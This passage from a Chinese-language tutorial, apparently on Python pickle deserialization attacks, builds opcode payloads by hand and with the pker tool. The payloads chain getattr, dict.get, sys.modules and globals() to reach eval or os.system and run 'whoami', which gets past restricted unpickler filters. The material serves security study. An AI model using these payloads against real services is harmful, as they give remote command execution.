<span class="p">{</span><span class="s1">'sys'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'sys'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'builtins'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'builtins'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_frozen_importlib'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_frozen_importlib'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_imp'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_imp'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_thread'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_thread'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_warnings'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_warnings'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_weakref'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_weakref'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'winreg'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'winreg'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_io'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_io'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'marshal'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'marshal'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'nt'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'nt'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_frozen_importlib_external'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_frozen_importlib_external'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'time'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'time'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'zipimport'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'zipimport'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_codecs'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_codecs'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'codecs'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'codecs'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'encodings.aliases'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'encodings.aliases'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">encodings</span><span class="se">\\</span><span class="s1">aliases.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'encodings'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'encodings'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">encodings</span><span class="se">\\</span><span class="s1">__init__.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'encodings.utf_8'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'encodings.utf_8'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">encodings</span><span class="se">\\</span><span class="s1">utf_8.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_codecs_cn'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_codecs_cn'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_multibytecodec'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_multibytecodec'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'encodings.gbk'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'encodings.gbk'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">encodings</span><span class="se">\\</span><span class="s1">gbk.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_signal'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_signal'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_abc'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_abc'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'abc'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'abc'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'io'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'io'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'__main__'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'__main__'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_stat'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_stat'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'stat'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'stat'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_collections_abc'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_collections_abc'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'genericpath'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'genericpath'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_winapi'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_winapi'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'ntpath'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'ntpath'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'os.path'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'ntpath'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'os'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'os'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_sitebuiltins'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_sitebuiltins'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_distutils_hack'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_distutils_hack'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">site-packages</span><span class="se">\\</span><span class="s1">_distutils_hack</span><span class="se">\\</span><span class="s1">__init__.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'pywin32_system32'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'pywin32_system32'</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">NamespaceLoader</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x000002387C3F5C50</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'pywin32_bootstrap'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'pywin32_bootstrap'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">site-packages</span><span class="se">\\</span><span class="s1">win32</span><span class="se">\\</span><span class="s1">lib</span><span class="se">\\</span><span class="s1">pywin32_bootstrap.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'site'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'site'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'atexit'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'atexit'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_ast'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_ast'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'itertools'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'itertools'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'keyword'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'keyword'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">keyword.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_operator'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_operator'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'operator'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'operator'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">operator.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'reprlib'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'reprlib'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">reprlib.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_collections'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_collections'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'collections'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'collections'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">collections</span><span class="se">\\</span><span class="s1">__init__.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'types'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'types'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">types.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_functools'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_functools'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'functools'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'functools'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">functools.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'contextlib'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'contextlib'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">contextlib.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'enum'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'enum'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">enum.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'ast'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'ast'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">ast.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_opcode'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_opcode'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'opcode'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'opcode'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">opcode.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'dis'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'dis'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">dis.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'collections.abc'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'collections.abc'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">collections</span><span class="se">\\</span><span class="s1">abc.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'importlib._bootstrap'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_frozen_importlib'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'importlib._bootstrap_external'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_frozen_importlib_external'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'warnings'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'warnings'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">warnings.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'importlib'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'importlib'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">importlib</span><span class="se">\\</span><span class="s1">__init__.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'importlib.machinery'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'importlib.machinery'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_sre'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_sre'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'re._constants'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'re._constants'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">re</span><span class="se">\\</span><span class="s1">_constants.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'re._parser'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'re._parser'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">re</span><span class="se">\\</span><span class="s1">_parser.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'re._casefix'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'re._casefix'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">re</span><span class="se">\\</span><span class="s1">_casefix.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'re._compiler'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'re._compiler'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">re</span><span class="se">\\</span><span class="s1">_compiler.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'copyreg'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'copyreg'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">copyreg.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'re'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'re'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">re</span><span class="se">\\</span><span class="s1">__init__.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'token'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">token.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'tokenize'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'tokenize'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">tokenize.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'linecache'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'linecache'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">linecache.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'inspect'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'inspect'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">inspect.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'rlcompleter'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'rlcompleter'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">rlcompleter.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_struct'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_struct'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'struct'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'struct'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">struct.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_compat_pickle'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_compat_pickle'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">_compat_pickle.py'</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'_pickle'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'_pickle'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">'pickle'</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">'pickle'</span> <span class="kn">from</span> <span class="s1">'C:</span><span class="se">\\</span><span class="s1">Python311</span><span class="se">\\</span><span class="s1">Lib</span><span class="se">\\</span><span class="s1">pickle.py'</span><span class="o">&gt;</span><span class="p">}</span>
</pre></div>
<p>出于需要使用opcode表示我们的命令的限制,我们最终构造出的payload是<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code></p>
<p>写成opcode就是这样的</p>
<div class="highlight"><pre><span></span><span class="n">geteval</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''cbuiltins</span>
<span class="s1">getattr</span>
<span class="s1">(cbuiltins</span>
<span class="s1">getattr</span>
<span class="s1">(cbuiltins</span>
<span class="s1">dict</span>
<span class="s1">S'get'</span>
<span class="s1">tR(cbuiltins</span>
<span class="s1">globals</span>
<span class="s1">)RS'__builtins__'</span>
<span class="s1">tRS'eval'</span>
<span class="s1">tR(S'__import__("os").system("whoami")'</span>
<span class="s1">tR.</span>
<span class="s1">'''</span>
</pre></div>
<p>如果用pker生成opcode的话就是这样的</p>
<p>payload"<code>getattr(builtins.dict,"get")(sys.modules,"os").system("whoami")</code></p>
<p>给pker的输入</p>
<div class="highlight"><pre><span></span><span class="nb">getattr</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'builtins'</span><span class="p">,</span><span class="s1">'getattr'</span><span class="p">)</span>
<span class="nb">dict</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'builtins'</span><span class="p">,</span><span class="s1">'dict'</span><span class="p">)</span>
<span class="n">get</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">dict</span><span class="p">,</span><span class="s1">'get'</span><span class="p">)</span>
<span class="n">mod</span><span class="o">=</span><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'sys'</span><span class="p">,</span><span class="s1">'modules'</span><span class="p">)</span>
<span class="n">os</span><span class="o">=</span><span class="n">get</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span><span class="s1">'os'</span><span class="p">)</span>
<span class="n">system</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="s1">'system'</span><span class="p">)</span>
<span class="n">system</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">)</span>
<span class="k">return</span>
</pre></div>
<p>用pker写成opcode</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"cbuiltins</span><span class="se">\n</span><span class="s2">getattr</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">0cbuiltins</span><span class="se">\n</span><span class="s2">dict</span><span class="se">\n</span><span class="s2">p1</span><span class="se">\n</span><span class="s2">0g0</span><span class="se">\n</span><span class="s2">(g1</span><span class="se">\n</span><span class="s2">S'get'</span><span class="se">\n</span><span class="s2">tRp2</span><span class="se">\n</span><span class="s2">0csys</span><span class="se">\n</span><span class="s2">modules</span><span class="se">\n</span><span class="s2">p3</span><span class="se">\n</span><span class="s2">0g2</span><span class="se">\n</span><span class="s2">(g3</span><span class="se">\n</span><span class="s2">S'os'</span><span class="se">\n</span><span class="s2">tRp4</span><span class="se">\n</span><span class="s2">0g0</span><span class="se">\n</span><span class="s2">(g4</span><span class="se">\n</span><span class="s2">S'system'</span><span class="se">\n</span><span class="s2">tRp5</span><span class="se">\n</span><span class="s2">0g5</span><span class="se">\n</span><span class="s2">(S'whoami'</span><span class="se">\n</span><span class="s2">tR."</span>
</pre></div>
<h6 data-content="1" id="c27fd6d2bb5adfa87d06d876d672acc5">利用<code>builtins.globals()</code>获取危险函数.</h6>
<p>还可以用builtins的<code>globals()</code>方法获取危险函数.<code>globals()</code>方法返回一个字典</p>
<blockquote>
<p>返回的字典包含了所有全局作用域内的名称（键）及其对应的值（值）.这个字典反映了当前模块全局命名空间的状态</p>
</blockquote>
<p>其中固然也包含了一些危险模块.</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">builtins</span><span class="o">.</span><span class="n">globals</span><span class="p">()</span>
<span class="p">{</span><span class="s1">'__name__'</span><span class="p">:</span> <span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'__doc__'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s1">'__package__'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s1">'__loader__'</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">_frozen_importlib</span><span class="o">.</span><span class="n">BuiltinImporter</span><span class="s1">'&gt;, '</span><span class="n">__spec__</span><span class="s1">': None, '</span><span class="n">__annotations__</span><span class="s1">': {}, '</span><span class="n">__builtins__</span><span class="s1">': &lt;module '</span><span class="n">builtins</span><span class="s1">' (built-in)&gt;, '</span><span class="n">builtins</span><span class="s1">': &lt;module '</span><span class="n">builtins</span><span class="s1">' (built-in)&gt;, '</span><span class="n">os</span><span class="s1">': &lt;module '</span><span class="n">os</span><span class="s1">' (frozen)&gt;, '</span><span class="n">pickle</span><span class="s1">': &lt;module '</span><span class="n">pickle</span><span class="s1">' from '</span><span class="n">C</span><span class="p">:</span>\\<span class="n">Python311</span>\\<span class="n">Lib</span>\\<span class="n">pickle</span><span class="o">.</span><span class="n">py</span><span class="s1">'&gt;, '</span><span class="n">sys</span><span class="s1">': &lt;module '</span><span class="n">sys</span><span class="s1">' (built-in)&gt;}</span>
</pre></div>
